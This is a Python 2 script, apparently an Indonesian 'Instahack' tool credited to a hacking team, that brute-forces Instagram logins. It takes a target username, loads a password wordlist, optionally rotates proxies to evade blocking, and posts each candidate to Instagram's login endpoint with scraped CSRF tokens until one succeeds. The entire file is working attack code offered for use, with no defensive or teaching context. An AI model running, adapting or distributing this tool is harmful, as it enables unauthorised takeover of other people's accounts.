# author: Dani Ahmad
# Dark Force Army
# By Learning You Know Everythink...
# versi python2


import os 
import sys
import json
import time
import random
import requests

# pilihan warna cuk..
W = "\033[90;1m"
R = "\033[91;1m"
G = "\033[92;1m"
Y = "\033[93;1m"
B = "\033[94;1m"
P = "\033[95;1m"
A = "\033[96;1m"
Wl = "\033[97;1m"



# fungsi bantuan
def Input(text):
		value = ''
		if sys.version_info.major > 2:
				value = input(text)
		else:
				value = raw_input(text)
		return str(value)

# class utama cuk
class iqbalz():
		def __init__ (self, username, passwordlist='pass.txt'):
				self.username = username
				self.CurrentProxy = ''
				self.UsedProxys = []
				self.passwordlist = passwordlist
				self.loading_password()
				self.noobs()

				UseProxy = Input(R+'[=>] \033[96mTEKAN ENTER UNTUK MELANJUTKAN..... ').upper()
				if (UseProxy == 'y' or UseProxy == 'yes'):
						self.randomProxy()
				
		def loading_password(self):
				if os.path.isfile(self.passwordlist):
						with open(self.passwordlist) as f:
								self.passwords = f.read().splitlines()
								PasswordCuk = len(self.passwords)
								if (PasswordCuk > 0):
										print (W+'[#] %s Password Suksess Loading cuy...' % PasswordCuk)
								else:
										print ('File Password Kosong....')
										raw__input('Tekan Enter Untuk Keluar...')
										exit()
				else:
						print ('Tambahkan File Password')
						raw_input(R+'Tekan Enter Untuk Keluar...!')
						exit()

		def randomProxy(self):
				plist = open('proxy.txt').read().splitlines()
				proxy = random.choice(plist)
				if not proxy in self.UsedProxys:
						self.CurrentProxy = proxy
						self.UsedProxys.append(proxy)
				try:
						print ('cek ip')

				except Exception as e:
						print ('[#] can not reach proxy')
				print ('-----------')

		def noobs(self):
				r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username)
				if (r.status_code == 404):
						print ('[#] Username "%s" tidak ditemukan' % username)
						raw_input(R+'[<=] Tekan Enter Untuk Keluar....')
						exit()
				elif (r.status_code == 200):
						return True

		def Login(self, password):
				sess = requests.Session()

				if len(self.CurrentProxy) > 0:
						sess.proxies = { "http": self.CurrentProxy, "https": self.CurrentProxy }

				sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
				sess.headers.update({
						'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
						'x-instagram-ajax':'1',
						'X-Requested-With': 'XMLHttpRequest',
						'origin': 'https://www.instagram.com',
						'ContentType' : 'application/x-www-form-urlencoded',
						'Connection': 'keep-alive',
						'Accept': '*/*',
						'Referer': 'https://www.instagram.com',
						'authority': 'www.instagram.com',
						'Host' : 'www.instagram.com',
						'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
						'Accept-Encoding' : 'gzip, deflate'
					})
				
				r = sess.get('https://www.instagram.com/')
				sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})

				r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
				sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})


				data = json.loads(r.text)
				if (data['status'] == 'fail'):
						print (data['message'])
						UserProxy = Input(R+'[#] Terjadi kesalahan jaringan, \033[95m(Jangan tekan enter sebelum beberapa menit kemudian...!) ').upper()
						if (UserProxy == 'y'):
								print (Y+'[=>] \033[92mTEKAN ENTER AJAH CUK....!')
								randomProxy()
						return False

				if (data['authenticated'] == True):
						return sess
				else:
						return False
def banner():
	os.system('clear')
	print A+'''
 ___           _        _                _
|_ _|_ __  ___| |_ __ _| |__   __ _  ___| | __
 | || '_ \/ __| __/ _` | '_ \ / _` |/ __| |/ /
 | || | | \__ \ || (_| | | | | (_| | (__|   <
|___|_| |_|___/\__\__,_|_| |_|\__,_|\___|_|\_\		'''
	print " "
	print P+" Date:",G+ time.ctime()
	print W+"+--------------------------------------------+"
	print "|",R+"Author:\033[97m Dani Ahmad                      ",W+"|"
	print "|",R+"Team:\033[97m Dark Force Army                 ",W+"|"
        print "|",R+"Instagram:\033[97m Dani_ahmad65                     ",W+"|"
        print "|",R+"Github:\033[97m https://www.github.com/vanlx",W+"|"
        print "+--------------------------------------------+"
	print B+"  Powered By: DANI AHMAD "
	print W+"+--------------------------+"
	
banner()

iqbalz = iqbalz(Input(Wl+"[?]\033[92m Masukkan Username Target\033[95m => "))

try:
		delayLoop = int(Input(P+'[*] \033[93mMasukkan Jeda waktunya\033[92m [2,3,4]: '))
except Exception as e:
		print " "
		print (R+'[!!] Kan gw udah bilang pilih jeda waktu 2 sampai 4 detik dodol... ')
		delayLoop = 4
print ''


for password in iqbalz.passwords:
		sess = iqbalz.Login(password)
		if sess:
				print " "
				print W+"+----------------------------------+"
				print (R+"[+]\033[96m Login Berhasil\033[97m ===\033[91m[\033[97m %s \033[91m]\033[97m==" % password)
				print W+"+----------------------------------+"
				exit()
		else:
				print (P+"[\033[97m+\033[95m]\033[91;1m Mencoba Password \033[97m[ \033[90m%s \033[97m]" % password)

		try:
			  	time.sleep(delayLoop)
		except KeyboardInterrupt:
				WantToExit = str(Input('type y/n untuk keluar: ')).upper()
				if (WantToExit == 'y' or WantToExit == 'yes'):
						exit()
				else:
						continue
